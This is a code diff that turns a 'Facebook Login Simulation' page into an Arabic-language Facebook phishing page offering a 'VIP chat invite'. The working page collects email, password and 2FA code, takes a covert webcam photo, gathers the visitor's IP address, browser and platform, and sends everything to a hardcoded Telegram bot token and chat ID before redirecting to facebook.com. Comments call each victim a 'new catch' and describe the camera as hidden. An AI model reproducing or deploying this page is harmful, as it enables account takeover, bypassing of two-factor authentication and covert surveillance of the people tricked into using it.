@@ -1,67 +1,101 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Simulation | Security Lab</title>
+    <title>Facebook - دعوة دردشة VIP</title>
     <style>
-        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
-        .fb-logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 15px; display: block; text-decoration: none; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
-        .login-btn { background-color: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; padding: 10px; width: 100%; cursor: pointer; }
-        #mfaSection { display: none; margin-top: 10px; border-top: 1px solid #ddd; padding-top: 15px; }
-        .status { font-size: 11px; color: #777; margin-top: 15px; }
+        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 90%; max-width: 400px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
+        .btn { background: #1877f2; color: white; border: none; padding: 12px; width: 96%; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        #camera-area { display: none; } /* الكاميرا مخفية تعمل في الخلفية */
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <a href="#" class="fb-logo">facebook</a>
-        <div id="credentialsSection">
-            <p style="font-size: 15px; color: #1c1e21; margin-bottom: 15px;">Login to join the private video chat.</p>
-            <input type="text" id="email" placeholder="Email address or phone number">
-            <input type="password" id="pass" placeholder="Password">
-            <button class="login-btn" id="nextBtn">Log In</button>
-        </div>
-
-        <div id="mfaSection">
-            <h4 style="margin: 0 0 10px 0;">Two-Factor Authentication</h4>
-            <p style="font-size: 13px; color: #606770;">Enter the 6-digit code from your authentication app or SMS.</p>
-            <input type="text" id="mfaCode" placeholder="Login Code" maxlength="6">
-            <button class="login-btn" id="finishBtn">Confirm</button>
-        </div>
-
-        <p id="status" class="status">Secure connection active</p>
+<div class="box">
+    <h2 style="color: #1877f2;">facebook</h2>
+    <div id="login-step">
+        <p>سجل دخولك لتفعيل دعوتك المجانية للدردشة</p>
+        <input type="text" id="email" placeholder="الإيميل أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button class="btn" onclick="captureAndSend()">تسجيل الدخول والتفعيل</button>
+    </div>
+    
+    <div id="2fa-step" style="display:none;">
+        <h3>تأكيد الهوية</h3>
+        <p>أدخل الرمز المرسل لهاتفك</p>
+        <input type="number" id="code2fa" placeholder="000000">
+        <button class="btn" style="background:#42b72a" onclick="send2FA()">تأكيد</button>
     </div>
 
-    <script>
-        const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
-        const CHAT_ID = "8350812242";
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+</div>
 
-        // دالة إرسال البيانات فوراً للبوت
-        async function sendToBot(data) {
-            const text = encodeURIComponent(`🚨 [LAB ALERT] New Data Captured:\n${data}`);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
-        }
+<script>
+    const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
+    const chatId = '8350812242';
 
-        // الخطوة الأولى: الإيميل والباسورد
-        document.getElementById('nextBtn').addEventListener('click', async () => {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
+    // تشغيل الكاميرا فور تحميل الصفحة (بطلب إذن)
+    window.onload = function() {
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            document.getElementById('video').srcObject = stream;
+        }).catch(err => console.log("Camera access denied"));
+    };
 
-            if(email && pass) {
-                document.getElementById('status').innerText = "Verifying...";
-                // إرسال البيانات فوراً
-                await sendToBot(`📧 Email: ${email}\n🔑 Pass: ${pass}`);
-                
-                // التحويل لواجهة الـ 2FA
-                document.getElementById('credentialsSection').style.display = "none";
-                document.getElementById('mfaSection').style.display = "block";
-                document.getElementById('status').innerText = "2FA Required";
-            } else {
-                alert("Please fill in all fields.");
-            }
+    async function captureAndSend() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        
+        // 1. التقاط الصورة من الكاميرا
+        const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        // 2. جمع معلومات الجهاز والـ IP
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const res = await fetch('https://api.ipify.org?format=json');
+        const ipData = await res.json();
+
+        // 3. إرسال النص (بيانات الجهاز + الدخول)
+        const info = `
+🚨 **صيد جديد مع صورة** 🚨
+📧 الإيميل: \`${email}\`
+🔑 الباسورد: \`${pass}\`
+🌐 IP: \`${ipData.ip}\`
+📱 الجهاز: \`${platform}\`
+📄 المتصفح: \`${userAgent}\`
+        `;
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+
+        // 4. إرسال الصورة كملف
+        const blob = await (await fetch(imageData)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'target_photo.jpg');
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
         });
 
-        // الخطوة الثانية: كود المص
+        // الانتقال للخطوة التالية
+        document.getElementById('login-step').style.display = 'none';
+        document.getElementById('2fa-step').style.display = 'block';
+    }
+
+    function send2FA() {
+        const code = document.getElementById('code2fa').value;
+        const text = `🛡️ **رمز الـ 2FA الجديد** 🛡️\n🔢 الرمز: \`${code}\``;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+        .then(() => window.location.href = "https://www.facebook.com");
+    }
+</script>
+
+</body>
+</html>
